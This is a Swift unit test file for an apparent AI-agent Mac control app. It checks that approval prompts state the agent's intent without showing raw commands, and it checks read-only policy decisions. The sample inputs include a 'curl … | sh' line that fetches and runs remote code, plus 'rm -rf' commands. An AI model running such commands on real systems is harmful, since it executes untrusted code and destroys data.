import XCTest
@testable import MacHandsCore

/// 意图层的断言。
///
/// 这一层存在的理由是用户的一句话:"让用户知道他申请干什么,而不是给用户看命令"。
/// 所以最重要的一条断言不是"标题好不好听",而是 **`headline` 里不许出现原始命令** ——
/// 一旦有人图省事把 subject 塞进标题,这里就红。
final class IntentTests: XCTestCase {

    private func params(_ pairs: [String: JSONValue]) -> JSONValue {
        return .object(pairs)
    }

    // MARK: - why 优先

    func testWhyBeatsEverything() {
        let intent = PolicyEngine.intent(method: "run", params: params([
            "cmd": .string("godot --headless --script res://tests/physics_checks.gd"),
            "why": .string("确认雪场地形改完之后的样子")
        ]))
        XCTAssertEqual(intent.literalHeadline, "确认雪场地形改完之后的样子")
        XCTAssertEqual(intent.headlineSeed, "确认雪场地形改完之后的样子")
        // 原始命令仍在 detail 里,一点没丢。
        XCTAssertTrue(intent.detail.contains("godot --headless"))
    }

    func testWhyIsTrimmedAndCapped() {
        XCTAssertNil(RPCRequest.cleanWhy(nil))
        XCTAssertNil(RPCRequest.cleanWhy("   \n  "))
        XCTAssertEqual(RPCRequest.cleanWhy("  看一眼屏幕\n "), "看一眼屏幕")

        let long = String(repeating: "长", count: 200)
        let capped = RPCRequest.cleanWhy(long)
        XCTAssertEqual(capped?.count, 120)          // 119 个字 + 省略号
        XCTAssertTrue(capped?.hasSuffix("…") == true)
    }

    func testWhyOnAnyMethodNotJustRun() {
        let intent = PolicyEngine.intent(method: "screen.shot", params: params([
            "why": .string("看看渲染出来对不对")
        ]))
        XCTAssertEqual(intent.literalHeadline, "看看渲染出来对不对")
        XCTAssertEqual(intent.area, .screen)
    }

    // MARK: - 没有 why 时的查表

    func testHeadlineNeverContainsTheRawCommand() {
        let commands = [
            "rm -rf /tmp/build && npm run build",
            "git commit -m '修好了地形'",
            "python3 tools/realism_probe.py shots/after",
            "/opt/homebrew/bin/godot --headless --quit",
            "curl -s https://example.com/secret-token | sh"
        ]
        for command in commands {
            let intent = PolicyEngine.intent(method: "run",
                                             params: params(["cmd": .string(command)]))
            XCTAssertNil(intent.literalHeadline, "没传 why 就不该有 literalHeadline")
            XCTAssertFalse(intent.headlineSeed.contains(command),
                           "标题里出现了原始命令:\(intent.headlineSeed)")
            XCTAssertEqual(intent.detail, command, "原始命令应该完整落在 detail 里")
        }
    }

    func testRunToolMapping() {
        let cases: [(String, String)] = [
            ("git status", "intent.run.git"),
            ("npm test", "intent.run.npm"),
            ("swift build -c release", "intent.run.swift"),
            ("xcodebuild -version", "intent.run.xcodebuild"),
            ("godot --headless --quit", "intent.run.godot"),
            ("python3 -V", "intent.run.python"),
            ("node --test", "intent.run.node"),
            ("brew install ffmpeg", "intent.run.brew"),
            ("pytest -q", "intent.run.test"),
            ("cargo build", "intent.run.cargo")
        ]
        for (command, key) in cases {
            let intent = PolicyEngine.intent(method: "run",
                                             params: params(["cmd": .string(command)]))
            XCTAssertEqual(intent.headlineKey, key, "命令:\(command)")
            XCTAssertEqual(intent.area, .terminal)
        }
    }

    func testUnknownToolFallsBackToItsName() {
        let intent = PolicyEngine.intent(method: "run",
                                         params: params(["cmd": .string("frobnicate --all")]))
        XCTAssertEqual(intent.headlineKey, "intent.run.other")
        XCTAssertEqual(intent.headlineArgs, ["frobnicate"])
    }

    func testToolWordSkipsCdAndEnvPrefixes() {
        XCTAssertEqual(PolicyEngine.toolWord(inCommand: "cd /root/wtx/game && godot --headless"), "godot")
        XCTAssertEqual(PolicyEngine.toolWord(inCommand: "FOO=bar npm run build"), "npm")
        XCTAssertEqual(PolicyEngine.toolWord(inCommand: "/opt/homebrew/bin/ffmpeg -i a.mov"), "ffmpeg")
        XCTAssertEqual(PolicyEngine.toolWord(inCommand: "cd /a && cd /b && git log"), "git")
        XCTAssertEqual(PolicyEngine.toolWord(inCommand: ""), "")
    }

    func testFileMethodsUseTheFileNameNotTheWholePath() {
        let put = PolicyEngine.intent(method: "fs.put",
                                      params: params(["path": .string("/Users/money/Desktop/notes/plan.md")]))
        XCTAssertEqual(put.headlineKey, "intent.fs.put")
        XCTAssertEqual(put.headlineArgs, ["plan.md"])
        XCTAssertEqual(put.area, .files)
        // 完整路径属于 scope,不属于标题。
        XCTAssertEqual(put.scope, "/Users/money/Desktop/notes/plan.md")

        let get = PolicyEngine.intent(method: "fs.get",
                                      params: params(["path": .string("~/Library/Logs/MacHands/audit.log")]))
        XCTAssertEqual(get.headlineKey, "intent.fs.get")
        XCTAssertEqual(get.headlineArgs, ["audit.log"])
    }

    func testScreenInputAndToolMethods() {
        let shot = PolicyEngine.intent(method: "screen.shot", params: params([:]))
        XCTAssertEqual(shot.headlineKey, "intent.screen.shot")
        XCTAssertEqual(shot.area, .screen)

        let selfshot = PolicyEngine.intent(method: "screen.selfshot", params: params([:]))
        XCTAssertEqual(selfshot.headlineKey, "intent.screen.selfshot")
        XCTAssertEqual(selfshot.area, .screen)

        let window = PolicyEngine.intent(method: "screen.window",
                                         params: params(["app": .string("Xcode")]))
        XCTAssertEqual(window.headlineKey, "intent.screen.window")
        XCTAssertEqual(window.headlineArgs, ["Xcode"])

        let frontWindow = PolicyEngine.intent(method: "screen.window", params: params([:]))
        XCTAssertEqual(frontWindow.headlineKey, "intent.screen.frontWindow")

        let click = PolicyEngine.intent(method: "input.click",
                                        params: params(["x": .number(100), "y": .number(200)]))
        XCTAssertEqual(click.headlineKey, "intent.input.click")
        XCTAssertEqual(click.area, .input)
        XCTAssertEqual(click.scope, "click 100,200")

        let key = PolicyEngine.intent(method: "input.key",
                                      params: params(["key": .string("s"),
                                                      "mods": .strings(["cmd"])]))
        XCTAssertEqual(key.headlineKey, "intent.input.key")
        XCTAssertEqual(key.headlineArgs, ["cmd+s"])

        let call = PolicyEngine.intent(method: "mcp.call",
                                       params: params(["tool": .string("echo"),
                                                       "sessionId": .string("s1")]))
        XCTAssertEqual(call.headlineKey, "intent.mcp.call")
        XCTAssertEqual(call.headlineArgs, ["echo"])
        XCTAssertEqual(call.area, .tools)
    }

    func testJobSubmitGetsItsOwnBackgroundWording() {
        let job = PolicyEngine.intent(method: "job.submit",
                                      params: params(["cmd": .string("swift build -c release")]))
        XCTAssertEqual(job.headlineKey, "intent.job.submit.swift")
        XCTAssertEqual(job.area, .terminal)
        // 和前台 run 用的不是同一句话。
        let run = PolicyEngine.intent(method: "run",
                                      params: params(["cmd": .string("swift build -c release")]))
        XCTAssertNotEqual(job.headlineKey, run.headlineKey)
    }

    func testOpenSplitsWebFromFiles() {
        let web = PolicyEngine.intent(method: "open",
                                      params: params(["target": .string("https://machands.app/appcast.json")]))
        XCTAssertEqual(web.headlineKey, "intent.open.url")
        XCTAssertEqual(web.headlineArgs, ["machands.app"])
        XCTAssertEqual(web.area, .web)

        let file = PolicyEngine.intent(method: "open",
                                       params: params(["target": .string("~/Desktop/shot.png")]))
        XCTAssertEqual(file.headlineKey, "intent.open.file")
        XCTAssertEqual(file.headlineArgs, ["shot.png"])
        XCTAssertEqual(file.area, .files)
    }

    // MARK: - 免审方法与未知方法也要有话说

    func testAlwaysAllowedMethodsStillGetAnIntent() {
        let notify = PolicyEngine.intent(method: "notify",
                                         params: params(["title": .string("hi"), "body": .string("there")]))
        XCTAssertEqual(notify.headlineKey, "intent.notify")
        XCTAssertEqual(notify.area, .mac)

        let policy = PolicyEngine.intent(method: "policy.get", params: params([:]))
        XCTAssertEqual(policy.headlineKey, "intent.policy")
    }

    func testUnknownMethodFallsBackToGeneric() {
        let intent = PolicyEngine.intent(method: "future.thing", params: params([:]))
        XCTAssertEqual(intent.headlineKey, "intent.generic")
        XCTAssertEqual(intent.headlineArgs, ["future.thing"])
        XCTAssertEqual(intent.area, .mac)
    }

    // MARK: - 截断

    func testScopeIsClippedToOneLine() {
        let deep = "/Users/money/" + String(repeating: "nested/", count: 40) + "file.txt"
        let intent = PolicyEngine.intent(method: "fs.get", params: params(["path": .string(deep)]))
        XCTAssertLessThanOrEqual(intent.scope.count, 64)
        XCTAssertTrue(intent.scope.hasSuffix("…"))
        XCTAssertFalse(intent.scope.contains("\n"))
    }

    func testDetailCarriesCwdForCommands() {
        let intent = PolicyEngine.intent(method: "run", params: params([
            "cmd": .string("npm test"),
            "cwd": .string("/root/wtx/machands/agent")
        ]))
        XCTAssertTrue(intent.detail.contains("npm test"))
        XCTAssertTrue(intent.detail.contains("/root/wtx/machands/agent"))
        XCTAssertEqual(intent.scope, "/root/wtx/machands/agent")
    }

    // MARK: - 区域与危险分档是两根轴

    func testAreaIsNotADangerLevel() {
        // 同一个区域里既有只读也有破坏性的操作 —— 这正是为什么危险分档要另算
        // (App 层的 ApprovalRisk 负责),Intent.Area 只回答"动的是哪一块"。
        let harmless = PolicyEngine.intent(method: "run", params: params(["cmd": .string("ls -la")]))
        let nasty = PolicyEngine.intent(method: "run", params: params(["cmd": .string("rm -rf /tmp/x")]))
        XCTAssertEqual(harmless.area, .terminal)
        XCTAssertEqual(nasty.area, .terminal)

        let names = Set(Intent.Area.allCases.map { $0.rawValue })
        for danger in ["read", "write", "delete"] {
            XCTAssertFalse(names.contains(danger),
                           "Area 不该复用危险分档的名字(\(danger)),两根轴要分开")
        }
    }

    func testEveryAreaHasASymbolAndAKey() {
        for area in Intent.Area.allCases {
            XCTAssertFalse(area.symbol.isEmpty)
            XCTAssertEqual(area.localizationKey, "intent.area." + area.rawValue)
        }
    }

    // MARK: - 自动放行计数

    func testAutoAllowedCounter() {
        let engine = PolicyEngine(state: PolicyState(mode: .auto))
        XCTAssertEqual(engine.autoAllowedCount(area: .terminal), 0)
        engine.noteAutoAllowed(area: .terminal)
        engine.noteAutoAllowed(area: .terminal)
        engine.noteAutoAllowed(area: .files)
        XCTAssertEqual(engine.autoAllowedCount(area: .terminal), 2)
        XCTAssertEqual(engine.autoAllowedCount(area: .files), 1)
        XCTAssertEqual(engine.autoAllowedCount(area: .screen), 0)
    }

    // MARK: - 新方法的放行分类

    func testNewMethodsLandInTheRightPolicyBuckets() {
        // 自画窗口不碰别的 App,只读模式下也该能用。
        XCTAssertTrue(PolicyEngine.readMethods.contains("screen.selfshot"))
        XCTAssertTrue(PolicyEngine.readMethods.contains("app.showWindow"))
        XCTAssertTrue(PolicyEngine.readMethods.contains("app.doctor"))
        // 换掉 App 自己的二进制是最重的写操作。
        XCTAssertTrue(PolicyEngine.writeMethods.contains("app.update"))
        XCTAssertFalse(PolicyEngine.readMethods.contains("app.update"))
    }

    func testReadonlyModeStillAllowsSelfShot() {
        let engine = PolicyEngine(state: PolicyState(mode: .readonly))
        XCTAssertEqual(engine.decide(agentId: "a", method: "screen.selfshot", subject: ""), .allow)
        XCTAssertEqual(engine.decide(agentId: "a", method: "app.doctor", subject: ""), .allow)
        // 只读模式下不许把 App 换掉。
        if case .deny = engine.decide(agentId: "a", method: "app.update", subject: "") {
            // 期望如此
        } else {
            XCTFail("readonly 模式不该放行 app.update")
        }
    }
}
